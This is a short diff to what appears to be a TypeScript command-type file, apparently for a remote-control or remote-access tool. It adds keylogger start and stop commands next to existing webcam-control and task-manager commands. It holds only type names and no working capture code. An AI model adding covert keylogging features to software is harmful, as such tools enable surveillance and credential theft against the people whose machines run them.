@@ -34,7 +34,9 @@ export type CommandName =
   | "client-chat"
   | "tool-activation"
   | "webcam-control"
-  | "task-manager";
+  | "task-manager"
+  | "keylogger.start"
+  | "keylogger.stop";
 
 export interface PingCommandPayload {
   message?: string;
